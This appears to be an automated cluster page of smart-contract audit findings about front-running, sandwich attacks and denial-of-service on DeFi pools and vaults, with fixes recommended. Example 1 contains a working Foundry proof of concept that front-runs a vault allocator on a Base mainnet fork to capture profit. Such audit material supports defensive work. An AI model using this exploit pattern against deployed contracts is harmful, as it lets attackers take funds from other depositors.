# Cluster -1344

**Rank:** #357  
**Count:** 17  

## Label
Failure to verify or use authoritative pool state enables attackers to manipulate prices or trigger denial-of-service via race conditions, leading to failed liquidity creation and compromised liquidity security.

## Cluster Information
- **Total Findings:** 17

## Examples

### Example 1

**Auto Label:** Unauthorized asset reallocation and dynamic rate exploitation enable attackers to manipulate pool balances and profit from instant exchange rate fluctuations.  

**Original Text Preview:**

`onMorphoSupplyCollateral()` and `onMorphoRepay()` update the `lastTotalAssets` variable with the net profit or loss resulting from the operation. This will instantly modify the exchange rate for shares to assets, which opens the door for frontrunning attacks.

In the case of an increase in the value of the assets, an attacker can make a deposit just before the allocator's call and redeem the shares just after, profiting from the difference in the exchange rate.

In the case of a decrease in the value of the assets, shareholders can redeem their shares just before the allocator's call to avoid incurring losses, increasing the losses for the rest of the shareholders.

**Proof of concept**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/LoopedVaults.sol";
import "./utils/MockPricefeed.sol";

contract AuditTest is Test {
    using MarketParamsLib for MarketParams;

    address morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address pendlerouter = 0x888888888889758F76e7103c6CbF23ABbF58F946;
    address usdc = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address pricefeed;

    LoopedVault vault;
    address feeRecipient = makeAddr("FeeRecipient");
    address allocator = makeAddr("Allocator");
    address alice = makeAddr("Alice");
    address bob = makeAddr("Bob");
    address ptUsr = 0xa6F0A4D18B6f6DdD408936e81b7b3A8BEFA18e77;

    MarketParams mp;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org");

        pricefeed = address(new MockPricefeed());
        MockPricefeed(pricefeed).setPrice(usdc, 1e18);
        MockPricefeed(pricefeed).setPrice(ptUsr, 1e18);

        vault = new LoopedVault(usdc, pendlerouter, morpho, feeRecipient, allocator, pricefeed);

        mp.collateralToken = ptUsr;
        mp.loanToken = usdc;
        mp.oracle = 0x6AdeD60f115bD6244ff4be46f84149bA758D9085;
        mp.irm = 0x46415998764C29aB2a25CbeA6254146D50D22687;
        mp.lltv = 915000000000000000;

        vault.scheduleAddMarket(mp.id());
        vault.addMarket(mp);

        deal(usdc, alice, 10_000e6);
        deal(usdc, bob, 10_000e6);

        vm.prank(alice);
        IERC20(usdc).approve(address(vault), type(uint256).max);
        vm.prank(bob);
        IERC20(usdc).approve(address(vault), type(uint256).max);
    }

    function test_frontRunAllocator() public {
        vm.prank(alice);
        vault.deposit(100e6, alice);
        
        skip(7 days);

        MorphoLoop memory ml;
        ml.marketParams = mp;
        ml.amountToSupply = 5e18;
        ml.amountToBorrow = 4e6;

        SwapData memory swapData;
        swapData.swapType = SwapType(1);
        swapData.extRouter = 0x6131B5fae19EA4f9D964eAc0408E4408b66337b5;
        swapData.extCalldata = hex"e21fd0e90000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c7d3ab410d49b664d03fe5b1038852ac852b1b29000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000e801010000003d02000000ebbe893eab7c830de0e04cb54a974ea279b9d37a000000000000000000000000004c4b4001fff6fbe64b68d618d47c209fe40b0d8ee6e23c900a833589fcd6edb6e08f4c7c32d4f71b54bda0291335e5db674d8e93a03d814fa0ada70731efe8a4b9888888888889758f76e7103c6cbf23abbf58f9460000000000000000000000007fffffff00000054000000000000000000000000000000000000000000000000000000000000000000000000000000000000048c75d8895400000000000000004568412f557adc1e4f82e73edb06d29ff62c91ec8f5ff06571bdeb29000000000000000000000000000000000000000000000000000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda0291300000000000000000000000035e5db674d8e93a03d814fa0ada70731efe8a4b9000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000888888888889758f76e7103c6cbf23abbf58f94600000000000000000000000000000000000000000000000000000000004c4b4000000000000000000000000000000000000000000000000041efd7869134b782000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000c7d3ab410d49b664d03fe5b1038852ac852b1b29000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000004c4b4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002607b22536f75726365223a2250656e646c65222c22416d6f756e74496e555344223a22342e39383936303630323834363839383635222c22416d6f756e744f7574555344223a22342e393839363937373936353138343436222c22526566657272616c223a22222c22466c616773223a302c22416d6f756e744f7574223a2235303031333139303537373438333139323632222c2254696d657374616d70223a313734353931373733342c22526f7574654944223a2235636136633763642d616261302d343630322d626131322d653130623239313939396431222c22496e74656772697479496e666f223a7b224b65794944223a2231222c225369676e6174757265223a224172574f7263504839787541726d6d6a6c593475596574516a4b362b715066656f687a396f55594f376f596439766974684c7467726f346b674b744c4732464735735465414c624b703070494c686d68362f587276594b4a303550692f597650683535305759715a6330703736646b317242593947367a5861322b36753356456f2f53306c6657467950564d784b4c6b657258466b787448372b463938464b59766c356c692f307a2f457345424c30615556556c4c3532464d5a6b4e7142516c4c57704f4c415055584944556d6d5049556d68393436556a6a75704e2f4355474a45415644783242446b68712b49545a6a35553061425a4571462b2f4c534b724b38644b2f6a4c36464e34343946666938367059706753596e355257424938534c65596e4b306c48616f6d75646e66372f7a544164754f442f464e453754654a2b544250434f6d37567159792b7449506553435147413d3d227d7d";

        TokenInput memory input;
        input.tokenIn = usdc;
        input.netTokenIn = 5e6;
        input.tokenMintSy = 0x35E5dB674D8e93a03d814FA0ADa70731efe8a4b9;
        input.pendleSwap = 0x313e7Ef7d52f5C10aC04ebaa4d33CDc68634c212;
        input.swapData = swapData;

        ml.input = input;
        ml.SY = 0x4665d514e82B2F9c78Fa2B984e450F33d9efc842;
        ml.pendleMarket = 0x715509Bde846104cF2cCeBF6fdF7eF1BB874Bc45;

        // Bob is checking the mempool and notices that a tx will increase the value of the shares,
        // so he front-runs it with a deposit
        vm.prank(bob);
        uint256 bobDepositAmount = 10_000e6;
        uint256 bobShares = vault.deposit(bobDepositAmount, bob);

        vm.prank(allocator);
        vault.loopToMorpho(ml);

        // Bob withdraws his shares making an instant profit, which would correpond to Alice if he
        // didn't front-run the allocator's tx
        vm.prank(bob);
        uint256 assetsReceived = vault.redeem(bobShares, bob, bob);
        assert(assetsReceived > bobDepositAmount);
    }
}
```

**Recommendations**

- Use a vesting mechanism for profits resulting from the allocator's operations.
- Add a cooldown period for withdrawals.

---
### Example 2

**Auto Label:** Failure to verify or use authoritative pool state enables attackers to manipulate prices or trigger denial-of-service via race conditions, leading to failed liquidity creation and compromised liquidity security.  

**Original Text Preview:**

## Severity

Low Risk

## Description

The `initialize()` function of the DFDX contract sets `amount0Min` and `amount1Min` to zero when adding liquidity to Uniswap V3 pools. This practice exposes the protocol to sandwich attacks, as it allows front-running transactions to manipulate the prices and potentially result in a loss of value during liquidity provision.

Setting these parameters to non-zero values can protect against price slippage and mitigate the risk of sandwich attacks. The [Uniswap V3 documentation](https://docs.uniswap.org/contracts/v3/guides/providing-liquidity/mint-a-position#:~:text=We%20set%20amount0Min%20and%20amount1Min%20to%20zero%20for%20the%20example%20%2D%20but%20this%20would%20be%20a%20vulnerability%20in%20production.%20A%20function%20calling%20mint%20with%20no%20slippage%20protection%20would%20be%20vulnerable%20to%20a%20frontrunning%20attack%20designed%20to%20execute%20the%20mint%20call%20at%20an%20inaccurate%20price) explicitly states that setting amount0Min and amount1Min to zero introduces a vulnerability in production.

## Location of Affected Code

File: [src/DFDX.sol#L212](https://github.com/De-centraX/dfdx-erc20/blob/0da4e0acd24fc03e059b3e3497dfbc0569de2363/src/DFDX.sol#L212)

```solidity
uniswapV3PositionManager.mint(
    INonfungiblePositionManager.MintParams({
        token0: _token0,
        token1: _token1,
        fee: V3_POOL_FEE,
        tickLower: (MIN_TICK / tickSpacing) * tickSpacing,
        tickUpper: (MAX_TICK / tickSpacing) * tickSpacing,
        amount0Desired: _amount0Desired,
        amount1Desired: _amount1Desired,
        amount0Min: 0, // Vulnerable: should not be 0
        amount1Min: 0, // Vulnerable: should not be 0
        recipient: msg.sender,
        deadline: deadline
    })
);
```

## Impact

A function calling mint with no slippage protection would be vulnerable to a frontrunning attack designed to execute the mint call at an inaccurate price.

## Recommendation

Modify the `initialize()` function to compute reasonable non-zero values for `amount0Min` and `amount1Min`. These values should represent the minimum acceptable amounts based on the expected price range, ensuring that liquidity is only added when the pool's price remains within an acceptable range.

```solidity
uniswapV3PositionManager.mint(
    INonfungiblePositionManager.MintParams({
        token0: _token0,
        token1: _token1,
        fee: V3_POOL_FEE,
        tickLower: (MIN_TICK / tickSpacing) * tickSpacing,
        tickUpper: (MAX_TICK / tickSpacing) * tickSpacing,
        amount0Desired: _amount0Desired,
        amount1Desired: _amount1Desired,
        amount0Min: _amount0Desired * 98 / 100, // Example: Allow max 2% slippage
        amount1Min: _amount1Desired * 98 / 100, // Example: Allow max 2% slippage
        recipient: msg.sender,
        deadline: deadline
    })
);
```

## Team Response

Fixed.

## [I-01] Unsecured Uniswap V3 Liquidity Positions Due to Missing Lock Mechanism Allow Immediate Deployer Access

## Severity

Information

## Description

For Uniswap V2, the liquidity provider (LP) tokens received after adding liquidity are explicitly locked using the `uniswapV2Locker.lockLPToken()` function. This ensures that the LP tokens cannot be transferred or used until the lock duration expires:

```solidity
uniswapV2Locker.lockLPToken{value: lockerFee}(
    DFDX_DX_V2_PAIR,
    IERC20(DFDX_DX_V2_PAIR).balanceOf(address(this)),
    block.timestamp + LOCK_DURATION,
    payable(address(0)),
    true,
    payable(msg.sender)
);

uniswapV2Locker.lockLPToken{value: lockerFee}(
    DFDX_WETH_V2_PAIR,
    IERC20(DFDX_WETH_V2_PAIR).balanceOf(address(this)),
    block.timestamp + LOCK_DURATION,
    payable(address(0)),
    true,
    payable(msg.sender)
);
```

For Uniswap V3, the code mints new liquidity positions using the uniswapV3PositionManager.mint function. However, these positions are directly assigned to the `msg.sender`, and no mechanism locks them. This means the liquidity positions can be immediately utilized, transferred, or withdrawn by the deployer without any restrictions:

```solidity
uniswapV3PositionManager.mint(
    INonfungiblePositionManager.MintParams({
        token0: _token0,
        token1: _token1,
        fee: V3_POOL_FEE,
        tickLower: (MIN_TICK / tickSpacing) * tickSpacing,
        tickUpper: (MAX_TICK / tickSpacing) * tickSpacing,
        amount0Desired: _amount0Desired,
        amount1Desired: _amount1Desired,
        amount0Min: 0,
        amount1Min: 0,
        recipient: msg.sender, // Bug: Positions minted directly to msg.sender
        deadline: deadline
    })
);
```

So clearly there is an inconsistency after adding liquidity as in one case LP tokens are locked and in another case it is minted to `msg.sender` and not locked.

## Location of Affected Code

File: [src/DFDX.sol#L214](https://github.com/De-centraX/dfdx-erc20/blob/0da4e0acd24fc03e059b3e3497dfbc0569de2363/src/DFDX.sol#L214)

```solidity
uniswapV3PositionManager.mint(
    INonfungiblePositionManager.MintParams({
        token0: _token0,
        token1: _token1,
        fee: V3_POOL_FEE,
        tickLower: (MIN_TICK / tickSpacing) * tickSpacing,
        tickUpper: (MAX_TICK / tickSpacing) * tickSpacing,
        amount0Desired: _amount0Desired,
        amount1Desired: _amount1Desired,
        amount0Min: 0,
        amount1Min: 0,
        recipient: msg.sender, // Bug: Positions minted directly to msg.sender
        deadline: deadline
    })
);
```

## Impact

The Uniswap V3 LP positions are not subject to the same lock mechanism as Uniswap V2 LP tokens, allowing the deployer to access them immediately. The deployer could withdraw or sell the V3 positions, undermining the intended security of the liquidity provided.

## Recommendation

To resolve the issue, you should implement a locking mechanism for the Uniswap V3 positions.

## Team Response

Acknowledged.

## [I-02] Centralization Risk in `DFDX.sol`

## Severity

Information

## Description

- The deployer of the DFDX contract retains control of approximately 95.04% of the total token supply (844,888,888 out of 888,888,888).
- 888,888,888 tokens were minted and after that 44_000_000 tokens would be locked inside the UniV2 locker contract and the remaining supply (844,888,888) is in control of the deployer
- The deployer can manipulate the market by dumping large quantities of tokens, causing severe price volatility or a market crash.

## Location of Affected Code

File: [src/DFDX.sol](https://github.com/De-centraX/dfdx-erc20/blob/0da4e0acd24fc03e059b3e3497dfbc0569de2363/src/DFDX.sol)

```solidity
_transfer(address(this), msg.sender, balanceOf(address(this)));
```

```solidity
uint256 public constant TOTAL_SUPPLY = 888_888_888e18;
uint256 public constant INITIAL_LP_DFDX = 22_000_000e18;
```

## Impact

If exploited, it can lead to significant losses for users and investors.

## Recommendation

Mitigate centralization risks by transparently defining the purpose of retained tokens. Clearly communicate their intended use and provide a detailed roadmap outlining the timeline and plans for their allocation.

## Team Response

Acknowledged.

---
### Example 3

**Auto Label:** Failure to verify or use authoritative pool state enables attackers to manipulate prices or trigger denial-of-service via race conditions, leading to failed liquidity creation and compromised liquidity security.  

**Original Text Preview:**

The provisional owner of the contract launches the ULTI token by calling the `launch` function. In the private function `_createLiquidity` it is checked that Uniswap pool for the ULTI token does not exist and if it does, the function reverts.

```solidity
624:     function _createLiquidity(uint256 inputTokenForLP, uint256 deadline) private {
625:         // 1. Check if the Uniswap pool already exists
626:         // This check prevents a potential DoS attack on the `launch` function
627:         // If an attacker creates the pool before the contract owner,
628:         // it would revert here instead of allowing the attacker to manipulate the initial state
629:         address liquidityPoolAddress = uniswapFactory.getPool(address(this), inputTokenAddress, LP_FEE);
630:
631:         // 2. Create and store pool if it doesn't exist
632:         if (liquidityPoolAddress == address(0)) {
633:             liquidityPoolAddress = uniswapFactory.createPool(address(this), inputTokenAddress, LP_FEE);
634:             liquidityPool = IUniswapV3Pool(liquidityPoolAddress);
635:         } else {
636:   @>        revert LiquidityPoolAlreadyExists();
637:         }
```

While the comments state that a DoS attack is prevented, this is not the case. Reverting the transaction if the pool already exists prevents the manipulation of the initial price of the pool, but in doing so, it creates a DoS vector. If an attacker creates the pool before the contract owner, the `launch` function will revert, forcing the redeployment of the contract.

Consider executing the logic of the `launch` function in the constructor of the contract.

---
